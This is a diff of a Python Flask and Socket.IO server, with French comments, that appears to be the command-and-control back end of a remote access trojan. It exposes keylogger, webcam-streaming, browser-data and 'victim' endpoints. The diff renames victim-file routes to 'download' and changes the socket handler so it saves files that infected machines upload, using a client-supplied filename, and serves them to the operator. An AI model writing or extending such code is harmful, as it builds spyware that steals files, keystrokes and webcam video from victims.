@@ -50,7 +50,7 @@ browser_ns = api.namespace('api/v1/browser', description='Browser data operation
 keylogger_ns = api.namespace('api/v1/keylogger', description='Keylogger operations')
 webcam_ns = api.namespace('api/v1/webcam', description='Webcam operations')
 papier_ns = api.namespace('api/v1/papier', description='Papier operations')
-pc_victim_ns = api.namespace('api/v1/pc_victim', description='PC victim operations')
+download_file_ns = api.namespace('api/v1/download', description='Download file operations')
 
 auth_model = api.model('Auth', {'secret_key': fields.String(required=True, description='Clé secrète')})
 command_model = api.model('Command', {
@@ -93,15 +93,10 @@ papier_model = api.model('Papier', {
     'file_path': fields.String(required=True, description='Chemin du fichier du papier'),
     'date_created': fields.String(required=True, description='Date de création du papier')
 })
-pc_victim_model = api.model('PCVictim', {
-    'id': fields.Integer(required=True, description='ID de la victime'),
-    'ip': fields.String(required=True, description='Adresse IP de la victime'),
-    'os': fields.String(required=False, description='Système d\'exploitation de la victime'),
-    'os_version': fields.String(required=False, description='Version du système d\'exploitation de la victime'),
-    'hostname': fields.String(required=False, description='Nom d\'hôte de la victime'),
-    'status': fields.String(required=True, description='Statut de la victime'),
-    'date_created': fields.String(required=True, description='Date de création de la victime'),
-    'date_updated': fields.String(required=True, description='Date de mise à jour de la victime')
+download_file_model = api.model('DownloadFile', {
+    'id': fields.Integer(required=True, description='ID du fichier'),
+    'file_path': fields.String(required=True, description='Chemin du fichier'),
+    'date_created': fields.String(required=True, description='Date de création du fichier')
 })
 
 client_params = api.parser()
@@ -377,11 +372,11 @@ class StreamWebcam(Resource):
         return Response(stream_frames(), mimetype='multipart/x-mixed-replace; boundary=frame')
 
 
-@pc_victim_ns.route('/client/<int:client_id>')
-class GetPCVictimsByClientId(Resource):
+@download_file_ns.route('/client/<int:client_id>')
+class GetPCVictimFilesByClientId(Resource):
     @jwt_required()
     @api.doc(security='bearer_auth')
-    @pc_victim_ns.marshal_with(pc_victim_model, as_list=True)
+    @download_file_ns.marshal_with(download_file_model, as_list=True)
     def get(self, client_id):
         pc_victims = Command.query.filter_by(client_id=client_id, type=CommandType.PC_VICTIM).all()
         for pc_victim in pc_victims:
@@ -389,14 +384,14 @@ class GetPCVictimsByClientId(Resource):
         return pc_victims, 200
 
 
-@pc_victim_ns.route('/file/<int:pc_victim_id>')
+@download_file_ns.route('/file/<int:file_id>')
 class GetPCVictimFile(Resource):
     @jwt_required()
     @api.doc(security='bearer_auth')
-    def get(self, pc_victim_id):
-        pc_victim = Command.query.get(pc_victim_id)
-        if pc_victim and os.path.exists(pc_victim.file_path):
-            return send_file(pc_victim.file_path)
+    def get(self, file_id):
+        file = Command.query.get(file_id)
+        if file and os.path.exists(file.file_path):
+            return send_file(file.file_path)
         else:
             return {'status': 'error', 'message': 'Fichier de la victime non trouvé.'}, 404
 
@@ -542,21 +537,23 @@ def handle_frame(data):
     video_frames.put(frame_data)
 
 
-@socketio.on('pc_victim_response')
-def handle_pc_victim(data):
+@socketio.on('file_response')
+def handle_file(data):
+    file_data = base64.b64decode(data.get('file'))
     sid = request.sid
     client = Client.query.filter_by(sid=sid).first()
     if client:
-        file_bytes = base64.b64decode(data.get('file'))
-        file_dir = f"pc_victims/{client.ip}"
+        client_ip = client.ip
+        file_dir = f"files/{client_ip}"
         os.makedirs(file_dir, exist_ok=True)
-        file_path = f"{file_dir}/file.pdf"
+        file_name = data.get('file_name')
+        file_path = f"{file_dir}/{file_name}"
         with open(file_path, 'wb') as f:
-            f.write(file_bytes)
-        new_command = Command(type=CommandType.PC_VICTIM, client_id=client.id, file_path=file_path)
+            f.write(file_data)
+        new_command = Command(type=CommandType.DOWNLOAD_FILE, client_id=client.id, file_path=file_path)
         db.session.add(new_command)
         db.session.commit()
-        app.logger.info(f"Fichier de la victime reçu de {client.ip} et enregistré sous {file_path}")
+        app.logger.info(f"Fichier reçu de {client_ip} et enregistré sous {file_path}")
 
 
 @socketio.on('disconnect')
